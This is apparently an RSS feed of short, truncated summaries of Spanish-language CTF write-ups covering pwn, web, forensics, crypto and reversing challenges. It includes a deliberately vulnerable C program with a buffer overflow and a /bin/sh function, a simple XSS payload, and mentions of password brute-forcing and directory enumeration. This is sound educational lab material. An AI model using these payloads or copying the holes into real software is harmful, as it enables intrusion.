void bad_function() { execve("/bin/sh", NULL, NULL); } void vuln() { char data[10]; read(0, data, 170); } int main() { setvbuf(stderr, NULL, 2, 0); setvbuf(stdout, NULL, 2, 0); vuln(); return 0; } Existe una vulnerabilidad de Buffer Overflow.</description></item><item><title>Forensics 101</title><link>https://7rocky.github.io/ctf/ctflearn/forensics/forensics-101/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/forensics/forensics-101/</guid><description>Se nos pide encontrar la flag en esta imagen:
Sin embargo, la flag no está visible en la propia imagen ni oculta en su contenido. En cambio, podemos encontrar la flag en su contenido en crudo.
Para extraer los caracteres imprimibles de la imagen podemos utilizar strings y filtrar por CTFlearn encadenando el comando anterior con grep:
$ strings 95f6edfb66ef42d774a5a34581f19052.jpg | grep CTFlearn CTFlearn{wow!_data_is_cool}</description></item><item><title>Format</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/format/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/format/</guid><description>Se nos proporciona un binario de 64 bits llamado format:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Ingeniería inversa Después de ejecutarlo, vemos que el programa solamente repite lo que introducimos:
$ ./format asdf asdf fdsa fdsa Usando Ghidra, podemos hacer ingeniería inversa para ver el código fuente y observar lo que hace el programa:
int main(EVP_PKEY_CTX *param_1) { long canary; long in_FS_OFFSET; canary = *(long *) (in_FS_OFFSET + 0x28); init(param_1); echo(); if (canary !</description></item><item><title>Free Services</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/free-services/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/free-services/</guid><description>Se nos proporciona un archivo de Microsoft Office Excel llamado free_decryption.xlsm. La m en la extensión indica que el archivo contiene macros VBA.
Extracción de macros VBA Desgraciadamente, olevba de oletools no puede extraer el código VBA:
$ olevba free_decryption.xlsm olevba 0.60.1 on Python 3.10.9 - http://decalage.info/python/oletools =============================================================================== FILE: free_decryption.xlsm Type: OpenXML No VBA or XLM macros found. Por lo tanto, tendremos que abrir el archivo (y deshabilitar las macros). Tenemos dos hojas:</description></item><item><title>fs0ciety</title><link>https://7rocky.github.io/ctf/htb-challenges/misc/fs0ciety/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/misc/fs0ciety/</guid><description>Se nos proporciona un archivo ZIP llamado fsociety.zip:
$ unzip -v fsociety.zip Archive: fsociety.zip Length Method Size Cmpr Date Time CRC-32 Name -------- ------ ------- ---- ---------- ----- -------- ---- 729 Defl:N 186 75% 08-15-2017 17:44 e126a116 sshcreds_datacenter.txt -------- ------- --- ------- 729 186 75% 1 file Vemos que está protegido con contraseña:
$ unzip fsociety.zip Archive: fsociety.zip [fsociety.zip] sshcreds_datacenter.txt password: Por tanto, podemos probar a realizar un ataque de fuerza bruta usando rockyou.</description></item><item><title>Full Stack Conf</title><link>https://7rocky.github.io/ctf/htb-challenges/web/full-stack-conf/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/full-stack-conf/</guid><description>Se nos proporciona esta página web:
Al final de la página podemos introducir texto:
Si ponemos algunos datos, vemos un mensaje:
No obstante, la página pide que mostremos un alert(). Esto se suele usar como prueba de concepto para un ataque de Cross-Site Scripting (XSS). Uno de los payloads de XSS más sencillos es:
&amp;lt;img src=x onerror=alert(1)&amp;gt; Si lo usamos, veremos la flag en el alert (HTB{p0p..p0p..p0p...alert(1337)}):</description></item><item><title>Funds Secured</title><link>https://7rocky.github.io/ctf/htb-challenges/blockchain/funds-secured/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/blockchain/funds-secured/</guid><description>Se nos proporciona un archivo de Solidity llamado Campaign.sol:
// SPDX-License-Identifier: UNLICENSED pragma solidity 0.8.18; import {ECDSA} from "./lib/ECDSA.sol"; /// @notice MultiSignature wallet used to end the Crowdfunding and transfer the funds to a desired address contract CouncilWallet { using ECDSA for bytes32; address[] public councilMembers; /// @notice Register the 11 council members in the wallet constructor(address[] memory members) { require(members.length == 11); councilMembers = members; } /// @notice Function to close crowdfunding campaign.</description></item><item><title>funnylogin</title><link>https://7rocky.github.io/ctf/other/dicectf/funnylogin/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/dicectf/funnylogin/</guid><description>Se nos proporciona un proyecto de Node.js con un solo archivo app.js:
const express = require('express'); const crypto = require('crypto'); const app = express(); const db = require('better-sqlite3')('db.sqlite3'); db.exec(`DROP TABLE IF EXISTS users;`); db.exec(`CREATE TABLE users( id INTEGER PRIMARY KEY, username TEXT, password TEXT );`); const FLAG = process.env.FLAG || "dice{test_flag}"; const PORT = process.env.PORT || 3000; const users = [...Array(100_000)].map(() =&amp;gt; ({ user: `user-${crypto.randomUUID()}`, pass: crypto.randomBytes(8).toString("hex") })); db.exec(`INSERT INTO users (id, username, password) VALUES ${users.</description></item><item><title>Gawk</title><link>https://7rocky.github.io/ctf/htb-challenges/hardware/gawk/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/hardware/gawk/</guid><description>Se nos dice que alguien necesita ayuda con una impresora. Solo tenemos una dirección IP y un puerto. nmap no muestra información útil:
$ nmap -Pn -sV 167.99.207.74 -p 32108 Starting Nmap 7.93 ( https://nmap.org ) Nmap scan report for 167.99.207.74 Host is up (0.079s latency). PORT STATE SERVICE VERSION 32108/tcp open unknown Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 97.</description></item><item><title>GET aHEAD</title><link>https://7rocky.github.io/ctf/picoctf/web-exploitation/get-ahead/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/web-exploitation/get-ahead/</guid><description>Se nos proporciona una página web que muestra dos colores de fondo:
El botón rojo utiliza una petición GET y el azul usa una petición POST. Pero no vemos nada más.
Como el nombre del reto incluye HEAD, vamos a ver si qué pasa si hacemos petición HEAD con curl:
$ curl -I mercury.picoctf.net:47967 HTTP/1.1 200 OK flag: picoCTF{r3j3ct_th3_du4l1ty_cca66bd3} Content-type: text/html; charset=UTF-8</description></item><item><title>Getting Started</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/getting-started/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/getting-started/</guid><description>En este reto se nos pide explotar una vulnerabilidad de Buffer Overflow básica, a parte de darnos instrucciones y ejemplos:
$ nc 178.62.11.21 31609 Stack frame layout | . | &amp;lt;- Higher addresses | . | |_____________| | | &amp;lt;- 64 bytes | Return addr | |_____________| | | &amp;lt;- 56 bytes | RBP | |_____________| | | &amp;lt;- 48 bytes | target | |_____________| | | &amp;lt;- 40 bytes | alignment | |_____________| | | &amp;lt;- 32 bytes | Buffer[31] | |_____________| | .</description></item><item><title>Ghost Wrangler</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/ghost-wrangler/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/ghost-wrangler/</guid><description>Se nos proporciona un binario llamado ghost:
$ file ghost ghost: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=810d0f9271ec04d80a2eee6ff2afd9367da3c3dd, for GNU/Linux 3.2.0, not stripped Ingeniería inversa Si lo abrimos en Ghidra, veremos el código en C descompilado de la función main:
int main() { undefined8 flag; flag = get_flag(); printf("%s\r|\x1b[4m%*.c\x1b[24m| I\'ve managed to trap the flag ghost in this box, but it\'s turn ed invisible!</description></item><item><title>GhostlyTemplates</title><link>https://7rocky.github.io/ctf/htb-challenges/web/ghostlytemplates/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/ghostlytemplates/</guid><description>Se nos proporciona el siguiente sitio web:
También disponemos del código fuente en Go del servidor.
Análisis del código fuente El archivo relevante es main.go, que es un poco largo:
package main import ( "encoding/json" "fmt" "html/template" "io" "net/http" "os" "os/exec" "path/filepath" "strings" ) const WEB_PORT = "1337" const TEMPLATE_DIR = "./templates" type LocationInfo struct { Status string `json:"status"` Country string `json:"country"` CountryCode string `json:"countryCode"` Region string `json:"region"` RegionName string `json:"</description></item><item><title>Git Is Good</title><link>https://7rocky.github.io/ctf/ctflearn/forensics/git-is-good/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/forensics/git-is-good/</guid><description>Se nos proporciona un archivo ZIP que contiene un fichero flag.txt:
$ ls flag.txt $ cat flag.txt CTFlearn{REDACTED} Pero esta no es la flag. Mirando un poco más en la carpeta, descubrimos un directorio .git, por lo que estamos en un repositorio de Git (también, el nombre del reto nos lo indica):
$ ls -a . .. .git flag.txt Podemos utilizar git log para mostrar commits anteriores (es decir, confirmaciones que son como guardados del proyecto a lo largo del tiempo):</description></item><item><title>Gloater</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/gloater/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/gloater/</guid><description>Se nos proporciona un binario de 64 bits llamado gloater:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' También se nos proporciona un Dockerfile con la configuración del contenedor:
FROM ubuntu:20.04 ENV DEBIAN_FRONTEND noninteractive RUN apt-get update --fix-missing &amp;amp;&amp;amp; apt-get -y upgrade RUN apt-get install -y socat RUN useradd -m ctf COPY challenge/* /home/ctf/ RUN chown -R ctf:ctf /home/ctf/ WORKDIR /home/ctf #USER ctf EXPOSE 9001 CMD ["</description></item><item><title>Glory of the Garden</title><link>https://7rocky.github.io/ctf/picoctf/forensics/glory-of-the-garden/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/forensics/glory-of-the-garden/</guid><description>Se nos proporciona una imagen JPEG llamada garden.jpg:
El archivo se reconoce correctamente como imagen JPEG:
$ file garden.jpg garden.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 2999x2249, components 3 Sin embargo, si mostramos las cadenas de caracteres imprimibles en el contenido del archivo, obtendremos la flag (se puede indicar la longitud de la cadena a mostrar):
$ strings -50 garden.jpg Here is a flag "</description></item><item><title>Gobustme 👻</title><link>https://7rocky.github.io/ctf/ctflearn/web/gobustme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/web/gobustme/</guid><description>Tenemos esta página web:
En la parte de abajo se indica el uso de gobuster con un diccionario de rutas llamado dirb/common.txt:
Como el reto sugiere, vamos a usar gobuster con dirb/common.txt:
$ gobuster dir -u https://gobustme.ctflearn.com -w $WORDLISTS/dirb/common.txt -q -r /call (Status: 200) [Size: 42] /carpet (Status: 200) [Size: 69] /flag (Status: 200) [Size: 15] /hide (Status: 200) [Size: 65] /index.html (Status: 200) [Size: 2712] /sex (Status: 200) [Size: 58] /shadow (Status: 200) [Size: 68] /skin (Status: 200) [Size: 120] Perfecto, vamos a /flag para conseguir la flag:</description></item><item><title>Gonna-Lift-Em-All</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/gonna-lift-em-all/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/gonna-lift-em-all/</guid><description>Se nos proporciona el siguiente código en Python para cifrar la flag:
from Crypto.Util.number import bytes_to_long, getPrime import random FLAG = b'HTB{??????????????????????????????????????????????????????????????????????}' def gen_params(): p = getPrime(1024) g = random.randint(2, p-2) x = random.randint(2, p-2) h = pow(g, x, p) return (p, g, h), x def encrypt(pubkey): p, g, h = pubkey m = bytes_to_long(FLAG) y = random.randint(2, p-2) s = pow(h, y, p) return (g * y % p, m * s % p) def main(): pubkey, privkey = gen_params() c1, c2 = encrypt(pubkey) with open('data.</description></item><item><title>Gonna-Lift-Them-All</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/gonna-lift-them-all/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/gonna-lift-them-all/</guid><description>Se nos proporciona el siguiente código en Python para cifrar la flag:
from Crypto.Util.number import bytes_to_long, getPrime import random FLAG = b'HTB{??????????????????????????????????????????????????????????????????????}' def gen_params(): p = getPrime(1024) g = random.randint(2, p-2) x = random.randint(2, p-2) h = pow(g, x, p) return (p, g, h), x def encrypt(pubkey): p, g, h = pubkey m = bytes_to_long(FLAG) y = random.randint(2, p-2) s = pow(h, y, p) return (g * y % p, m * s % p) def main(): pubkey, privkey = gen_params() c1, c2 = encrypt(pubkey) with open('data.</description></item><item><title>Great Old Talisman</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/great-old-talisman/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/great-old-talisman/</guid><description>Se nos proporciona un binario de 64 bits llamado great_old_talisman:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Ingeniería inversa Si abrimos el binario en Ghidra, veremos este código fuente en C descompilado para la función main:
void main() { long in_FS_OFFSET; int n; undefined8 canary; canary = *(undefined8 *) (in_FS_OFFSET + 0x28); setup(); banner(); printf("\nThis Great Old Talisman will protect you from the evil powers of zombies!</description></item><item><title>Great Old Talisman</title><link>https://7rocky.github.io/ctf/other/htb-unictf/great-old-talisman/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-unictf/great-old-talisman/</guid><description>Se nos proporciona un binario de 64 bits llamado great_old_talisman:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Ingeniería inversa Si abrimos el binario en Ghidra, veremos este código fuente en C descompilado para la función main:
void main() { long in_FS_OFFSET; int n; undefined8 canary; canary = *(undefined8 *) (in_FS_OFFSET + 0x28); setup(); banner(); printf("\nThis Great Old Talisman will protect you from the evil powers of zombies!</description></item><item><title>Guessing Game 1</title><link>https://7rocky.github.io/ctf/picoctf/binary-exploitation/guessing-game-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/binary-exploitation/guessing-game-1/</guid><description>Se nos proporciona un binario estático de 64 bits llamado vuln
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Análisis de código estático Tenemos también el código fuente en C. Básicamente, lo que hace el programa es pedir un número, compararlo con otro aleatorio y si es el mismo, solicitar un nombre para mostrar un mensaje:
#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;sys/types.</description></item><item><title>Guessing Game 2</title><link>https://7rocky.github.io/ctf/picoctf/binary-exploitation/guessing-game-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/binary-exploitation/guessing-game-2/</guid><description>Se nos proporciona un binario de 32 bits llamado vuln:
Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) Análisis de código estático Tenemos también el código fuente en C. Básicamente, lo que hace el programa es pedir un número, compararlo con otro aleatorio y si es el mismo, solicitar un nombre para mostrar un mensaje:
#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #include &amp;lt;sys/stat.</description></item><item><title>Guglu v2</title><link>https://7rocky.github.io/ctf/other/hackon-ctf/guglu-v2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackon-ctf/guglu-v2/</guid><description>Se nos proporciona esta página web para crear notas. También existe un bot que accede a su perfil y accede después a una URL provista por nosotros. Disponemos también de los proyectos en Node.js.
Análisis del código fuente Las funciones de registro (/register) e inicio de sesión (/login) están correctamente implementadas.
La funcionalidad principal de la aplicación es la posibilidad de crear y buscar notas (web/src/routes/post.router.js):
router.get('/posts', (req, res) =&amp;gt; { const { page } = req.</description></item><item><title>Gunship</title><link>https://7rocky.github.io/ctf/htb-challenges/web/gunship/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/gunship/</guid><description>Tenemos una página web con una interfaz bastante chula:
Solamente existe una entrada de usuario:
Se trata de una aplicación en Node.js que utiliza pug como motor de plantillas (como se muestra en los archivos disponibles del reto).
También utiliza flat para parsear los datos en JSON, como se muestra en el siguiente archivo llamado routes/index.js:
const path = require('path') const express = require('express') const pug = require('pug') const { unflatten } = require('flat') const router = express.</description></item><item><title>H1 Thermostat</title><link>https://7rocky.github.io/ctf/hacker101ctf/h1-thermostat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/hacker101ctf/h1-thermostat/</guid><description>Tenemos un archivo APK de Android llamado thermostat.apk:
$ file thermostat.apk thermostat.apk: Zip archive data, at least v0.0 to extract, compression method=deflate Como se muestram un archivo APK es solo un archivo ZIP. Por tanto, podemos extraer su contenido:
$ 7z x thermostat.apk Scanning the drive for archives: 1 file, 2595443 bytes (2535 KiB) Extracting archive: thermostat.apk -- Path = thermostat.apk Type = zip Physical Size = 2595443 Everything is Ok Files: 569 Size: 4968479 Compressed: 2595443 $ ls AndroidManifest.</description></item><item><title>Hackerman</title><link>https://7rocky.github.io/ctf/htb-challenges/misc/hackerman/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/misc/hackerman/</guid><description>Se nos proporciona una imagen JPEG llamada hackerman.jpg:
$ file hackerman.jpg hackerman.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 960x540, components 3 Como es una imagen JPEG, podemos pensar en esteganografía usando steghide. Pero no parece que funcione de momento.
Si miramos los caracteres imprimibles de la imagen, veremos una cadena de texto que parece un hash MD5 (32 dígitos hexadecimales):</description></item><item><title>HackyBird</title><link>https://7rocky.github.io/ctf/htb-challenges/gamepwn/hackybird/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/gamepwn/hackybird/</guid><description>Tenemos un Flappy Bird para ordenador:
Objetivo El objetivo es pasar el máximo número de tuberías haciendo que el pájaro salte (usando la barra espaciadora). Si nos caemos o tocamos una tubería, perdemos. El juego es tan tonto que es realmente difícil, ya que necesita mucha precisión y concentración. Podemos pausarlo con la P.
En lugar de intentar batir el record, podemos arrancar Cheat Engine y modificar nuestros puntos.
Buscando la puntuación en memoria Después de agregar el proceso, tenemos que realizar un &amp;ldquo;New Scan&amp;rdquo; para buscar un 0 como &amp;ldquo;Exact value&amp;rdquo;:</description></item><item><title>Halloween Invitation</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/halloween-invitation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/halloween-invitation/</guid><description>Se nos proporciona un archivo ZIP que contiene un fichero llamado invitation.docm:
$ unzip -l Halloween\ Invitation.zip Archive: Halloween Invitation.zip Length Date Time Name --------- ---------- ----- ---- 5252634 10-12-2022 14:04 invitation.docm --------- ------- 5252634 1 file $ unzip Halloween\ Invitation.zip Archive: Halloween Invitation.zip [Halloween Invitation.zip] invitation.docm password: inflating: invitation.docm $ file invitation.docm invitation.docm: Microsoft Word 2007+ Extracción de macros VBA Esto significa que tenemos un documento de Microsoft Word con macros VBA.</description></item><item><title>Halloween Invitation</title><link>https://7rocky.github.io/ctf/other/hackthebooctf/halloween-invitation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/hackthebooctf/halloween-invitation/</guid><description>Se nos proporciona un archivo ZIP que contiene un fichero llamado invitation.docm:
$ unzip -l forensics_halloween_invitation.zip Archive: forensics_halloween_invitation.zip Length Date Time Name --------- ---------- ----- ---- 5252634 10-12-2022 08:04 invitation.docm --------- ------- 5252634 1 file $ unzip forensics_halloween_invitation.zip Archive: forensics_halloween_invitation.zip inflating: invitation.docm $ file invitation.docm invitation.docm: Microsoft Word 2007+ Extracción de macros VBA Esto significa que tenemos un documento de Microsoft Word con macros VBA. En lugar de abrir Microsoft Word, podemos usar olevba de oletools para extraer el código VBA:</description></item><item><title>Hash the Filesystem</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/hash-the-filesystem/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/hash-the-filesystem/</guid><description>Se nos proporciona un código fuente que nos pide iniciar sesión y nos ofrece algunas funcionalidades. Esta es la función principal:
def challenge(req): fnames = initializeDatabase() file_record['admin'] = [fname for fname in fnames] req.sendall(b'Super secret file server for malicious operations.\n' + b'Who are you:\n' + b'&amp;gt; ') user = req.recv(4096).decode().strip() if user == 'admin': req.sendall( b'Administrator can access the server only via ssh.\nGoodbye!\n') return token = json.dumps({'username': user, 'timestamp': str(time.time())}) file_record[user] = [] key = os.</description></item><item><title>HauntMart</title><link>https://7rocky.github.io/ctf/htb-challenges/web/hauntmart/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/hauntmart/</guid><description>Se nos proporciona el siguiente sitio web:
También disponemos del código fuente de Python del servidor (Flask).
En primer lugar, podemos registrar una nueva cuenta e iniciar sesión:
Y llegamos a este dashboard:
La única funcionalidad es &amp;ldquo;Sell Product&amp;rdquo;:
En este punto, analicemos el código fuente.
Análisis del código fuente En blueprints/routes.py, encontramos este endpoint que maneja la funcionalidad anterior:
@api.route('/product', methods=['POST']) @isAuthenticated def sellProduct(user): if not request.is_json: return response('Invalid JSON!</description></item><item><title>Headache</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/headache/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/headache/</guid><description>Tenemos un binario llamado headache:
$ file headache headache: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, stripped Reconocimiento básico Al ejecutarlo, escribe Initialising y tras unos segundos, nos pregunta por una clave:
$ ./headache Initialising..... Enter the key: asdf Login Failed! Vamos a depurarlo un poco con GDB. Una vez que nos pide la clave, podemos presionar ^C y poner un breakpoint después de la instrucción read:</description></item><item><title>Hellhound</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/hellhound/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/hellhound/</guid><description>Tenemos un binario de 64 bits llamado hellound:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./.glibc/' Si lo ejecutamos, tenemos la posibilidad de realizar algunas acciones extrañas:
$ ./hellhound This is what it used to look before the modifications.. _ / \ _-' _/| \-''- _ / __-' { | \ / \ / 'o. |o } | \ ; ', \_ __\ ''-_ \.</description></item><item><title>Hello World!</title><link>https://7rocky.github.io/ctf/hacker101ctf/hello-world/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/hacker101ctf/hello-world/</guid><description>Se nos proporciona un binario de 64 bits llamado vulnerable:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments Si ejecutamos el binario, parece que no hace nada:
$ ./vulnerable asdf fdsa 1 2 Si insertamos datos desde la entrada estándar (stdin), vemos que el programa funciona:
$ echo asdf | ./vulnerable Hello asdf ! Vamos a enviar 100 caracteres utilizando Python para ver si falla:</description></item><item><title>Here's a LIBC</title><link>https://7rocky.github.io/ctf/picoctf/binary-exploitation/heres-a-libc/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/binary-exploitation/heres-a-libc/</guid><description>Se nos proporciona un binario de 64 bits llamado vuln y un archivo libc.so.6 como librería externa:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./' Si ejecutamos el binario obtendremos una violación de segmento (segmentation fault):
$ chmod +x vuln $ ./vuln zsh: segmentation fault (core dumped) ./vuln Está configurado para utilizar Glibc desde el directorio actual:
$ ldd vuln linux-vdso.</description></item><item><title>Hextraordinary</title><link>https://7rocky.github.io/ctf/ctflearn/cryptography/hextraordinary/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/cryptography/hextraordinary/</guid><description>El reto nos presenta a ROXy, una codificadora que se especializa en códigos secretos con cifrados cortos y difíciles de descrifrar.
Se nos proporcionan estos valores en hexadecimal y sabemos que ella ha realizado algo para generar el código secreto:
0xc4115 0x4cf8 De hecho, el nombre ROXy es una pista porque está utilizando cifrado XOR. Si operamos estos números utilizando XOR, obtenemos el código secreto:
$ python3 -q &amp;gt;&amp;gt;&amp;gt; hex(0xc4115 ^ 0x4cf8) '0xc0ded' Luego la flag es: CTFlearn{0xc0ded}.</description></item><item><title>Hide and seek</title><link>https://7rocky.github.io/ctf/other/ecsc-2023/hide-and-seek/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/ecsc-2023/hide-and-seek/</guid><description>I have hidden my flag among the elliptic curve points. Go seek!
Challenge contributed by CryptoHack
Challenge files:
output.txt hide_and_seek.sage Análisis del código fuente Se nos proporciona un script de SageMath que usa criptografía de curva elíptica para cifrar la flag:
from Crypto.Util.number import bytes_to_long FLAG = bytes_to_long(open("flag.txt", "rb").read().strip()[len("ECSC{"):-1]) proof.arithmetic(False) p = 1789850433742566803999659961102071018708588095996784752439608585988988036381340404632423562593 a = 62150203092456938230366891668382702110196631396589305390157506915312399058961554609342345998 b = 1005820216843804918712728918305396768000492821656453232969553225956348680715987662653812284211 F = GF(p) E.&amp;lt;G&amp;gt; = EllipticCurve(F, [a, b]) assert FLAG &amp;lt; G.</description></item><item><title>Highlighter</title><link>https://7rocky.github.io/ctf/imaginaryctf/highlighter/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/highlighter/</guid><description>Se nos proporciona un binario llamado highlighter:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Si usamos Ghidra, veremos el siguiente código descompilado de la función main:
int main() { int __fd; long in_FS_OFFSET; undefined8 *where; undefined8 what; long canary; canary = *(long *) (in_FS_OFFSET + 0x28); setbuf(stdin, (char *) 0x0); setbuf(stdout, (char *) 0x0); __fd = open("flag.txt", 0); read(__fd, flag, 100); puts("</description></item><item><title>Highlights</title><link>https://7rocky.github.io/ctf/imaginaryctf/highlights/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/highlights/</guid><description>Se nos proporciona un binario llamado highlights:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Si usamos Ghidra, veremos el siguiente código descompilado de la función main:
int main() { undefined8 *address; FILE *fp; setbuf(stdout, (char *) 0x0); setbuf(stdin, (char *) 0x0); fp = fopen("./flag.txt", "r"); __isoc99_fscanf(fp, "%s", flag); printf("What address (in hex) would you like to read?\n&amp;gt;&amp;gt;&amp;gt; "); __isoc99_scanf("%lx%c", &amp;amp;address, &amp;amp;dead); printf("</description></item><item><title>Hijack</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/hijack/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/hijack/</guid><description>Se nos proporciona una instancia remota a la que conectarnos:
$ nc 167.71.143.44 31614 &amp;lt;------[TCS]------&amp;gt; [1] Create config [2] Load config [3] Exit &amp;gt; Reconocimiento básico Tenemos dos opciones. Usando la primera, podemos establecer una configuración y la salida es una cadena codificada en Base64:
